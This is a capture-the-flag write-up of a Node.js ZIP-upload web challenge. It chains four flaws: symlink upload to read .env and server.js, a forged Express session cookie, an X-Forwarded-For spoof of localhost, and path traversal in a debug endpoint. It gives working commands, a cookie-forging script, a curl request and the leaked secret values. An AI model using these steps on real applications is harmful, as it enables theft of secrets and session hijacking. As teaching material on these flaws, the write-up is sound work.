---
title: "Exploiting Symlink Upload and Session Forgery"
date: 2025-09-01
draft: false
readingTime: "12 min"
---

## Introduction

During TFC 2025 CTF, I encountered a fascinating web challenge that showcased how multiple seemingly minor vulnerabilities can be chained together to achieve complete system compromise. The application appeared simple on the surface: upload a ZIP file, extract it, and serve the contents for download. However, beneath this straightforward functionality lurked a perfect storm of security issues.

This writeup demonstrates a complete exploit chain combining symlink traversal, path traversal, session forgery, and authentication bypass. What makes this particularly interesting is how each vulnerability alone might seem insignificant, but together they create a devastating attack vector.

### Attack Chain Overview

1. Upload ZIP containing symlinks to sensitive files
2. Extract session secret and development session ID
3. Forge developer session cookie
4. Bypass 403 restrictions using X-Forwarded-For header
5. Exploit path traversal in debug endpoint
6. Access arbitrary files including the flag

---

## Initial Reconnaissance

The target application is a Node.js/Express web server that provides file upload and management functionality. Users can upload ZIP files which are automatically extracted and made available for download through a personalized directory structure based on their session ID.

**Key Functionality:** The application uses session-based isolation to separate user files. Each user gets their own directory under `/uploads/<userId>`, and the app attempts to prevent users from accessing other users' files through path traversal protection.

### Technology Stack

- **Runtime:** Node.js with Express.js framework
- **File Handling:** Multer for uploads, native `execFile` for unzipping
- **Session Management:** express-session with MemoryStore
- **Environment Config:** dotenv for environment variables

---

## Source Code Analysis

Let's dive deep into the application source code to identify the vulnerabilities. I'll analyze each component systematically, starting with the main routing logic.

### Main Router (index.js)
```javascript
const express = require('express');
const multer = require('multer');
const path = require('path');
const { execFile } = require('child_process');
const fs = require('fs');
const ensureSession = require('../middleware/session');
const developmentOnly = require('../middleware/developmentOnly');

const router = express.Router();

router.use(ensureSession);

const upload = multer({ dest: '/tmp' });

router.get('/', (req, res) => {
  res.render('index', { sessionId: req.session.userId });
});

router.get('/upload', (req, res) => {
  res.render('upload');
});

router.post('/upload', upload.single('zipfile'), (req, res) => {
    const zipPath = req.file.path;
    const userDir = path.join(__dirname, '../uploads', req.session.userId);
  
    fs.mkdirSync(userDir, { recursive: true });
  
    // Command: unzip temp/file.zip -d target_dir
    execFile('unzip', [zipPath, '-d', userDir], (err, stdout, stderr) => {
      fs.unlinkSync(zipPath); // Clean up temp file
  
      if (err) {
        console.error('Unzip failed:', stderr);
        return res.status(500).send('Unzip error');
      }
  
      res.redirect('/files');
    });
  });

router.get('/files', (req, res) => {
  const userDir = path.join(__dirname, '../uploads', req.session.userId);
  fs.readdir(userDir, (err, files) => {
    if (err) return res.status(500).send('Error reading files');
    res.render('files', { files });
  });
});

router.get('/files/:filename', (req, res) => {
    const userDir = path.join(__dirname, '../uploads', req.session.userId);
    const requestedPath = path.normalize(req.params.filename);
    const filePath = path.resolve(userDir, requestedPath);
  
    // Prevent path traversal
    if (!filePath.startsWith(path.resolve(userDir))) {
      return res.status(400).send('Invalid file path');
    }
  
    if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
      res.download(filePath);
    } else {
      res.status(404).send('File not found');
    }
  });

router.get('/debug/files', developmentOnly, (req, res) => {
    const userDir = path.join(__dirname, '../uploads', req.query.session_id);
    fs.readdir(userDir, (err, files) => {
    if (err) return res.status(500).send('Error reading files');
    res.render('files', { files });
  });
});

module.exports = router;
```

---

## Vulnerability Analysis

### Vulnerability #1: Symlink Preservation in ZIP Extraction

The first critical vulnerability lies in how the application handles ZIP file extraction. The code uses the system's `unzip` command without any flags to prevent symlink preservation:
```javascript
execFile('unzip', [zipPath, '-d', userDir], (err, stdout, stderr) => {
  fs.unlinkSync(zipPath);
  // ...
});
```

**Security Impact:** By default, the `unzip` utility preserves symbolic links found in ZIP archives. An attacker can create a ZIP file containing symlinks to sensitive system files. When extracted, these symlinks will point to arbitrary filesystem locations, effectively bypassing the application's intended file isolation.

When a user downloads a symlinked file through the `/files/:filename` endpoint, the application follows the symlink and serves the target file's contents. This is because Node.js's `fs.statSync().isFile()` follows symlinks by default, and `res.download()` will read and serve the symlink target.

#### Why This Works

- The `unzip` command preserves symlinks without the `-L` flag
- Node.js filesystem operations follow symlinks automatically
- The path traversal check in `/files/:filename` validates the symlink path itself, not its target
- The check `!filePath.startsWith(path.resolve(userDir))` passes because the symlink is physically located within `userDir`

### Vulnerability #2: Path Traversal in Debug Endpoint

The debug endpoint contains a textbook path traversal vulnerability:
```javascript
router.get('/debug/files', developmentOnly, (req, res) => {
    const userDir = path.join(__dirname, '../uploads', req.query.session_id);
    fs.readdir(userDir, (err, files) => {
    if (err) return res.status(500).send('Error reading files');
    res.render('files', { files });
  });
});
```

**Security Impact:** The `session_id` query parameter is directly concatenated into the file path without any validation or sanitization. An attacker can inject path traversal sequences like `../../../` to access any directory on the system that the Node.js process has read permissions for.

#### Path Construction Breakdown
```javascript
// Normal request: /debug/files?session_id=abc123
__dirname                    = /home/aniket/src/routes
path.join(..., '../uploads') = /home/aniket/src/uploads
path.join(..., 'abc123')     = /home/aniket/src/uploads/abc123

// Malicious request: /debug/files?session_id=../../../tmp
__dirname                    = /home/aniket/src/routes
path.join(..., '../uploads') = /home/aniket/src/uploads
path.join(..., '../../../tmp') = /home/aniket/tmp
```

### Vulnerability #3: Weak Authentication Bypass

The debug endpoint is protected by a `developmentOnly` middleware that checks two conditions:
```javascript
module.exports = function (req, res, next) {
    if (req.session.userId === 'develop' && req.ip == '127.0.0.1') {
      return next();
    }
    res.status(403).send('Forbidden: Development access only');
  };
```

**Requirements to Bypass:**
- Have a valid session with `userId` set to `'develop'`
- Request must appear to come from `127.0.0.1`

#### IP Address Spoofing

The application has trust proxy enabled in the server configuration:
```javascript
app.set('trust proxy', true);
```

This setting makes Express trust the `X-Forwarded-For` header to determine the client's IP address. While this is necessary for applications behind reverse proxies, it creates a security vulnerability when the proxy doesn't properly validate or sanitize this header. An attacker can simply set `X-Forwarded-For: 127.0.0.1` to satisfy the IP check.

### Vulnerability #4: Session Secret Exposure

The application's session management reveals critical information in the server initialization code:
```javascript
const store = new session.MemoryStore();
const sessionData = {
    cookie: {
      path: '/',
      httpOnly: true,
      maxAge: 1000 * 60 * 60 * 48
    },
    userId: 'develop'
};

// Development session created with a fixed ID
store.set('<redacted>', sessionData, err => {
    if (err) console.error('Failed to create develop session:', err);
    else console.log('Development session created!');
  });

app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: store
}));
```

**Key Observations:**
- A development session is pre-created with `userId: 'develop'`
- The session secret is loaded from `.env` file via dotenv
- The raw session ID is stored somewhere in the codebase (redacted in challenge)
- Both `server.js` and `.env` are readable files within the application directory

---

## Exploitation Strategy

Now that we've identified all the vulnerabilities, let's connect the dots. Here's our attack strategy:

1. **Use symlink upload to read server configuration files** - Extract `SESSION_SECRET` from `.env` and development `session_id` from `server.js`
2. **Forge a valid developer session cookie** - Use the extracted secret to create a properly signed session cookie
3. **Bypass IP and authentication checks** - Access the debug endpoint with forged credentials
4. **Exploit path traversal** - Navigate to the flag file using the debug endpoint's path traversal

---

## Step-by-Step Exploitation

### Step 1: Creating Malicious Symlinks

First, we need to create symlinks pointing to the sensitive configuration files:
```bash
# Create symlink to the environment file
ln -s /app/.env env

# Create symlink to the server configuration
ln -s /app/server.js server

# Package them into a ZIP file
zip --symlinks config.zip env server
```

**Important:** Use the `--symlinks` flag when creating the ZIP to ensure symlinks are preserved rather than being followed and replaced with actual file contents.

### Step 2: Uploading and Extracting Symlinks

Upload the `config.zip` file through the application's upload interface. The server will:

1. Store the uploaded file in `/tmp`
2. Create a user directory at `/uploads/<your-session-id>`
3. Extract the ZIP contents, preserving the symlinks
4. Redirect you to `/files` where you can see the extracted files

### Step 3: Downloading Symlinked Files

Navigate to `/files` and click the download button for both `env` and `server` files.

**.env contents:**
```
SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b
```

**server.js excerpt:**
```javascript
store.set('amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E', sessionData, err => {
    if (err) console.error('Failed to create develop session:', err);
    else console.log('Development session created!');
});
```

**Extracted Credentials:**
- **Session Secret:** `3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b`
- **Development Session ID:** `amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E`

### Step 4: Forging the Developer Session Cookie

Express.js uses signed cookies to prevent tampering. Create a Node.js script to generate the valid cookie:
```javascript
const signature = require('cookie-signature');

// Extracted values
const sid = 'amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E';
const secret = '3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b';

// Sign the session ID
const signed = 's:' + signature.sign(sid, secret);

console.log('Forged Cookie:');
console.log('connect.sid=' + signed);
```

**Execute the script:**
```bash
$ node forge_cookie.js
Forged Cookie:
connect.sid=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE
```

### Step 5: Accessing the Debug Endpoint

Now we can bypass authentication and access the debug endpoint:
```bash
curl -v http://localhost:3000/debug/files?session_id=../../../g67phz7m \
  -H "Cookie: connect.sid=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE" \
  -H "X-Forwarded-For: 127.0.0.1"
```

**Request Breakdown:**
- **session_id=../../../g67phz7m** - Path traversal to access another user's folder
- **Cookie header** - Our forged developer session cookie  
- **X-Forwarded-For: 127.0.0.1** - Spoofs the request as localhost

### Step 6: Capturing the Flag

Create another symlink ZIP pointing to the flag file:
```bash
# Create symlink to the flag file
ln -s /files/flag.txt flag

# Package it
zip --symlinks flag.zip flag

# Upload and download to get the flag!
```

**Flag Captured!** By chaining multiple vulnerabilities together, we've successfully compromised the application.